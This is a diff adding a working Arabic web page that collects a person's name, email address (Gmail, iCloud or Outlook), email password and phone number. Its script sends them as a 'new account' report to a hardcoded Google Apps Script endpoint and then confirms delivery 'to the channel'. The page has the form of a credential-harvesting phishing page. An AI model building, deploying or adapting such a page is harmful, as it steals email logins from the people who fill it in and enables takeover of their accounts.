@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال بيانات</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; padding: 20px; display: flex; justify-content: center; }
+        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        h2 { text-align: center; color: #0088cc; border-bottom: 2px solid #0088cc; padding-bottom: 10px; }
+        label { display: block; margin-top: 15px; font-weight: bold; color: #333; }
+        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; outline: none; }
+        input:focus { border-color: #0088cc; }
+        .email-row { display: flex; gap: 5px; }
+        .email-row input { flex: 2; }
+        .email-row select { flex: 1; }
+        button { width: 100%; padding: 15px; margin-top: 25px; border: none; border-radius: 8px; background-color: #0088cc; color: white; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #006699; }
+        button:disabled { background-color: #ccc; cursor: not-allowed; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>📩 إدخال بيانات الحساب</h2>
+    
+    <label>الاسم الثلاثي (سيكون اسم الملف):</label>
+    <input type="text" id="name" placeholder="مثال: مصطفى حسن">
+
+    <label>الايميل:</label>
+    <div class="email-row">
+        <input type="text" id="emailUser" placeholder="اسم المستخدم">
+        <select id="emailDomain">
+            <option value="@gmail.com">@gmail.com</option>
+            <option value="@icloud.com">@icloud.com</option>
+            <option value="@outlook.com">@outlook.com</option>
+        </select>
+    </div>
+
+    <label>الرمز (Password):</label>
+    <input type="text" id="password" placeholder="كلمة المرور">
+
+    <label>رقم الهاتف:</label>
+    <input type="tel" id="phone" placeholder="078xxxxxxxx">
+
+    <button id="sendBtn" onclick="sendData()">إرسال الآن ✅</button>
+</div>
+
+<script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbycbE8HkRKY3pDiPxAIMbSUKdYNbKFLKQjBxEHKhw4zZg_mX9_5E1rmTaioPmoDBqTM7A/exec";
+
+    async function sendData() {
+        const btn = document.getElementById('sendBtn');
+        const name = document.getElementById('name').value;
+        const emailUser = document.getElementById('emailUser').value;
+        const emailDomain = document.getElementById('emailDomain').value;
+        const pass = document.getElementById('password').value;
+        const phone = document.getElementById('phone').value;
+
+        if (!name || !emailUser || !pass) {
+            alert("⚠️ يرجى كتابة الاسم والايميل والرمز");
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerText = "جاري الإرسال...";
+
+        const fullEmail = emailUser + emailDomain;
+        const report = `📩 حساب جديد 📩\n\n👤 الاسم:\n${name}\n📧 الايميل:\n${fullEmail}\n🔑 الرمز:\n${pass}\n📞 الهاتف:\n${phone}`;
+
+        try {
+            // نستخدم طريقة إرسال متوافقة مع Google Script
+            await fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    name: name,
+                    details: report
+                })
+            });
+
+            alert("تم الإرسال بنجاح إلى القناة ✅");
+            
+            // تصفير البيانات
+            document.getElementById('name').value = "";
+            document.getElementById('emailUser').value = "";
+            document.getElementById('password').value = "";
+            document.getElementById('phone').value = "";
+            
+        } catch (error) {
+            alert("❌ حدث خطأ، حاول مرة أخرى");
+            console.error(error);
+        } finally {
+            btn.disabled = false;
+            btn.innerText = "إرسال الآن ✅";
+        }
+    }
+</script>
+
+</body>
+</html>
